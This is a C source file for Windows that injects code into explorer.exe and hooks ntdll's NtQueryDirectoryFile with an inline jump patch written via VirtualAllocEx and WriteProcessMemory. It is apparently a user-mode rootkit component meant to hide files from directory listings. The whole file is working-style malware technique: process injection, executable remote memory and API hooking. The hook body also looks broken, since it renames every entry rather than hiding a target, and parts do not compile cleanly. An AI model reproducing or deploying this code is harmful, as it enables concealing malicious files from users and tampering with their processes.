#include "Stealth.h"

#pragma warning(suppress : 4996)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define Lower(s1) s1 >=65 && s1<=90 ? (wchar_t)s1 +32 : s1

ULONGLONG GetAddressOfFunctionAddress(PVOID Func);


NTSTATUS NTAPI NewNtQueryDirectoryFile(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG                  QueryFlags,
    PUNICODE_STRING        FileName,
    BOOLEAN                RestartScan) {

    volatile NTSTATUS* CloneNtQueryDirectoryFile = 0xAAAAAAAAAAAAAAAA;
    wchar_t* HideFileName = (ULONGLONG)CloneNtQueryDirectoryFile + 0x18;

    NTSTATUS ntstatus = ((NTSTATUS(*)(
        HANDLE                 FileHandle,
        HANDLE                 Event,
        PIO_APC_ROUTINE        ApcRoutine,
        PVOID                  ApcContext,
        PIO_STATUS_BLOCK       IoStatusBlock,
        PVOID                  FileInformation,
        ULONG                  Length,
        FILE_INFORMATION_CLASS FileInformationClass,
        ULONG                  QueryFlags,
        PUNICODE_STRING        FileName,
        BOOLEAN                RestartScan))CloneNtQueryDirectoryFile)(
            FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, 
            FileInformation, Length, FileInformationClass, QueryFlags, FileName, RestartScan);


    if (ntstatus != STATUS_SUCCESS)
    {
        return ntstatus;
    }

    PFILE_ID_BOTH_DIR_INFORMATION pCur = FileInformation;

    pCur = (ULONGLONG)pCur+pCur->NextEntryOffset;
    pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;
    

    while(TRUE) {
            BOOL ret= TRUE;
            pCur->FileNameLength = 3;
            *(pCur->FileName) = '=';
            *(pCur->FileName+1) = ')';
            *(pCur->FileName+2) = 0x00;
            
            if (pCur->NextEntryOffset == 0) 
                break;
            
            pCur = (ULONGLONG)pCur+pCur->NextEntryOffset;
        }


    return ntstatus;
}

DWORD GetProcessPID(LPWSTR name) {
    PSYSTEM_PROCESS_INFORMATION spi;
    ULONG Length=0;
    DWORD processID=0;
    
    while (TRUE) {
        if (NtQuerySystemInformation(5, NULL, NULL, &Length) != STATUS_INFO_LENGTH_MISMATCH)
            continue;

        spi = VirtualAlloc(NULL, Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (spi == NULL)
            continue;
       
        if (NT_SUCCESS(NtQuerySystemInformation(5, spi, Length, &Length)))
            break;

        VirtualFree(spi,0, MEM_RELEASE);
    }

    //PSYSTEM_PROCESS_INFORMATION temp = spi;
    spi = (ULONGLONG)spi + spi->NextEntryOffset;
    while (TRUE)
    {
        if (wcsicmp(spi->ImageName.Buffer, name)==0) {
            processID = spi->UniqueProcessId;
            break;
        }
        if (spi->NextEntryOffset == 0)
            break;
        
        spi = (ULONGLONG)spi + spi->NextEntryOffset;
    }


    //VirtualFree(temp, Length, MEM_DECOMMIT);
    //VirtualFree(temp, 0, MEM_RELEASE);
    return processID;
}

int ByteArray(BYTE* Array, ULONGLONG Address) {

    for (int i = 0; i < 8; i++) {
        Array[8-i-1] = Address >> ((8-i-1) * 8);
    }
    return 0;
}



int findOffset(PVOID FuncAddress) {
    ULONGLONG CC = 0xAAAAAAAAAAAAAAAA;
    for (int size = 0;; size++) {
        if (memcmp((ULONGLONG)FuncAddress + size, &CC, 8) == 0) {
            return size;
        }
    }
}


void Stealth(LPWSTR Target){
    LPWSTR name = L"explorer.exe";
    LPWSTR name2 = Target;
    int size;
    HANDLE Process;
    PVOID FuncAddress;
    LPVOID Temp;
    BYTE Jump_code[12] = { 0x48,0xb8, };
    PVOID NtQueryDirectoryFile = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryDirectoryFile");
    DWORD Old;
    ULONGLONG CC = 0xCCCCCCCCCCCCCCCC;
    ULONGLONG offsetAddress[] = {0,};
    int offset;


    DWORD processId = GetProcessPID(name);
    printf("PID: %d\n", processId);
    Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (Process == NULL) {
        printf("OpenProcess Errror %x", GetLastError());
        return 0;
    }
    printf("NtQueryDirectoryFile Address: %p\n", NtQueryDirectoryFile);
    FuncAddress = (ULONGLONG)NewNtQueryDirectoryFile;


    for (size = 0;;  size++) {
        if (memcmp((ULONGLONG)FuncAddress + size, &CC, 8)==0) {
            break;
        }
    }
    printf("size: %llx\n", size);
    printf("offsetAddress: %p\n", offsetAddress);
    BYTE* NtQuerysystemInformain_ByteCode = (BYTE*)malloc(size);
    if (NtQuerysystemInformain_ByteCode == NULL) {
        printf("malloc Error %x\n", GetLastError());
    }


    memcpy_s(NtQuerysystemInformain_ByteCode, size, (ULONGLONG)FuncAddress, size);
    memcpy_s(Backup_code, size, NtQuerysystemInformain_ByteCode, size);
    offset = findOffset(NewNtQueryDirectoryFile);
    printf("offset %x\n", offset);
    BYTE* inject_ByteCode = (BYTE*)malloc(size+0x18);
    if (inject_ByteCode == NULL) {
        printf("malloc Error %x\n", GetLastError());
        return 0;
    }

    Temp = VirtualAllocEx(Process, NULL, size+0x18, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("HookFunc Address: %p\n", Temp);

    if (Temp == NULL) {
        printf("VirtualAllocEx Error %x\n", GetLastError());
        free(inject_ByteCode);
        return 0;
    }
    ByteArray(offsetAddress, ((ULONGLONG)Temp + (ULONGLONG)size));


    memcpy_s(inject_ByteCode, size, NtQuerysystemInformain_ByteCode, size);
    memcpy_s(&inject_ByteCode[size], 0x18, NtQueryDirectoryFile, 0x18);

    memcpy_s(&inject_ByteCode[offset], 0x8, offsetAddress, 0x8);

    ByteArray(&Jump_code[2], (ULONGLONG)Temp);
    Jump_code[10] = 0xff;
    Jump_code[11] = 0xE0;


    if (WriteProcessMemory(Process, Temp, inject_ByteCode, size + 0x18 , NULL) == 0) {
        printf("WriteProcessMemory Error %x\n", GetLastError());
        free(inject_ByteCode);
        return 0;
    }

    if (WriteProcessMemory(Process, (ULONGLONG)Temp+ size + 0x18, name2, wcslen(name2)*2, NULL) == 0) {
        printf("WriteProcessMemory Error %x\n", GetLastError());
        free(inject_ByteCode);
        return 0;
    }


    if (VirtualProtectEx(Process, NtQueryDirectoryFile, sizeof(Jump_code), PAGE_EXECUTE_READWRITE, &Old) == FALSE) {
        printf("VirtualProtectEx Error %x\n", GetLastError());
        free(inject_ByteCode);
        return 0;
    }



    if (WriteProcessMemory(Process, NtQueryDirectoryFile, Jump_code, sizeof(Jump_code), NULL) == 0) {
        printf("WriteProcessMemory Error %x\n", GetLastError());
        free(inject_ByteCode);
        return 0;
    }
}
